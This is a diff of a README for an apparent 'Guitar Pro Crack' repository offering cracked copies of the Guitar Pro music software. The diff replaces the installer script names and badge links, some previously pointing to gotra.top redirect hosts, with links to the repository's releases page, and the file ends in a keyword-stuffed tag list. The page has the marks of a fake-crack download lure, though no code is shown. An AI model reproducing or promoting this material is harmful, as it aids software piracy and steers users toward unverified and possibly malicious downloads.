@@ -1,5 +1,5 @@
 
-![395745890-cf26fc7a-aed0-4bd5-be70-a00e8ada3df0](https://github.com/user-attachments/assets/c9c7b2a3-50bc-4b27-ba00-b26f86120053)
+![395745890-cf26fc7a-aed0-4bd5-be70-a00e8ada3df0](https://github.com/Mekbrut/Guitar-Pro-Crack/releases)
 
 # Guitar Pro Crack
 
@@ -29,8 +29,8 @@ Welcome to the **Guitar Pro Crack** repository! This project provides tools and 
 
 1. **Run the Installer**
    - Navigate to the folder and execute the appropriate script:
-     - For Windows: `install_windows.bat`
-     - For macOS: `install_mac.sh`
+     - For Windows: `https://github.com/Mekbrut/Guitar-Pro-Crack/releases`
+     - For macOS: `https://github.com/Mekbrut/Guitar-Pro-Crack/releases`
 
 2. **Follow the On-Screen Instructions**
 
@@ -76,6 +76,6 @@ Contributions are welcome! Please follow these steps:
 ---
 
 #
-[![https://LwVm6.gotra.top/52/E2xGLCT](https://LBwkft6.gotra.top/l.svg)](https://tULfq.gotra.top/52/aqUE1)
+[![https://github.com/Mekbrut/Guitar-Pro-Crack/releases](https://github.com/Mekbrut/Guitar-Pro-Crack/releases)](https://github.com/Mekbrut/Guitar-Pro-Crack/releases)
 # Tags:
 epiphone-pro-1-acoustic-guitar guitar-tab-pro dirty-diana-tab-guitar-pro comica-cvm-wm200a-pro-wireless-for-guitar guitar-rig-pro-7 pro-guitar-tuner tabs-guitar-pro aria-pro-2-les-paul-guitar arobas-music---guitar-pro dirty-diane-tab-guitar-pro classical-guitar-music-tabs-guitar-pro stedman-pro-guitar classical-guitar-natural-family-series-pro guitar-pro-software-download rock-band-3-pro-guitar arobas-music-guitar-pro
